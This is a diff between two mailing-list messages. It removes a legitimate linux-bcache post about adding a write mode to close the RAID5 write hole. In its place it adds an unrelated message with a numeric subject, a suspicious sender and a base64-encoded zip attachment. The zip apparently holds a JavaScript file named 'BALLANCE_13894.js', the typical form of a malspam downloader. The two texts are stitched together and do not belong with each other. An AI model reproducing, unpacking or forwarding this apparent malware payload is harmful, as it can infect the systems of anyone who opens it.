@@ -1,82 +1,97 @@
-From: James Pharaoh <james@pharaoh.uk>
-Subject: Extra write mode to close RAID5 write hole (kind of)
-Date: Wed, 26 Oct 2016 16:20:38 +0100
-Message-ID: <bd0112e0-976a-59e8-94ef-81777f240ffd@pharaoh.uk>
+From: <richard@oxbridgeprograms.com>
+Subject: 36004373575628 linux-bcache
+Date: Wed, 26 Oct 2016 17:54:04 -0000
+Message-ID: <147750444438.5995.2274085763103290810@138-117-220-87-clientes.rcasistemas.net.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="INFO_254678173680_linux-bcache.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from kiara-balancer-1.wellbehavedsoftware.com ([138.201.134.108]:46684
-        "EHLO kiara-balancer-1.wellbehavedsoftware.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1753786AbcJZPZ7 (ORCPT
-        <rfc822;linux-bcache@vger.kernel.org>);
-        Wed, 26 Oct 2016 11:25:59 -0400
-Received: from mail-backup-1.vpn.wellbehavedsoftware.com (unknown [10.109.160.60])
-        by mail-hub.vpn.wellbehavedsoftware.com (Postfix) with ESMTP id 5CECDB6BF7
-        for <linux-bcache@vger.kernel.org>; Wed, 26 Oct 2016 15:20:50 +0000 (UTC)
-Received: from [10.0.0.125] (89.red-83-46-81.dynamicip.rima-tde.net [83.46.81.89])
-        by mail-backup-1.vpn.wellbehavedsoftware.com (Postfix) with ESMTPSA id 01DF0C59B9
-        for <linux-bcache@vger.kernel.org>; Wed, 26 Oct 2016 15:20:39 +0000 (UTC)
+Received: from 138-117-220-87-clientes.rcasistemas.net.br ([138.117.220.87]:4359
+        "HELO 138-117-220-87-clientes.rcasistemas.net.br"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754674AbcJZRyd (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Wed, 26 Oct 2016 13:54:33 -0400
+Content-Disposition: attachment
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
 To: linux-bcache@vger.kernel.org
 
-Hi all,
-
-I'm creating an elaborate storage system and using bcache, with great 
-success, to combine SSDs with smallish (500GB) network mounted block 
-devices, with RAID5 in between.
-
-I believe this should allow me to use RAID5 at large scale without high 
-risk of data loss, because I can very quickly rebuild the small number 
-of devices efficiently, across a distributed system.
-
-I am using separate filesystems on each and abstracting their 
-combination at a higher level, and I have redundant copies of their data 
-in different locations (different countries in fact), so even if I lose 
-one it can be recreated efficiently.
-
-I believe this addresses the issue of two devices failing 
-simultaneously, because it would affect an even smaller proportion of 
-the total data than a single failure, which would simply trigger a 
-number of RAID5 rebuilds.
-
-I have high faith in SSD storage, especially given drives' SMART 
-capabilities to report failure well in advance of it happening, so it 
-occurs to me that bcache is going to close the RAID5 write hole for me, 
-assuming certain things.
-
-I am making assumptions about the ordering of writes that RAID5 makes, 
-and will post to the appropriate list about that, with the possibility 
-of another option. However, I also note that bcache "optimises" 
-sequential writes directly to the underlying device:
-
- > Since random IO is what SSDs excel at, there generally won't be much
- > benefit to caching large sequential IO. Bcache detects sequential IO
- > and skips it; it also keeps a rolling average of the IO sizes per
- > task, and as long as the average is above the cutoff it will skip all
- > IO from that task - instead of caching the first 512k after every
- > seek. Backups and large file copies should thus entirely bypass the
- > cache.
-
-Since I want my bcache device to essentially be a "journal", and to 
-close the RAID5 write hole, I would prefer to disable this behaviour.
-
-I propose, therefore, a further write mode, in which data is always 
-written to the cache first, and synced, before it is written to the 
-underlying device. This could be called "journal" perhaps, or something 
-similar.
-
-I am optimistic that this would be a relatively small change to the 
-code, since it only requires to always choose the cache to write data to 
-first. Perhaps the sync behaviour is also more complex, I am not 
-familiar with the internals.
-
-So, does anyone have any idea if this is practical, if it would 
-genuinely close the write hole, or any other thoughts?
-
-I am prepared to write up what I am designing in detail and open source 
-it, I believe it would be a useful method of managing this kind of high 
-scale storage in general.
-
-James
+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
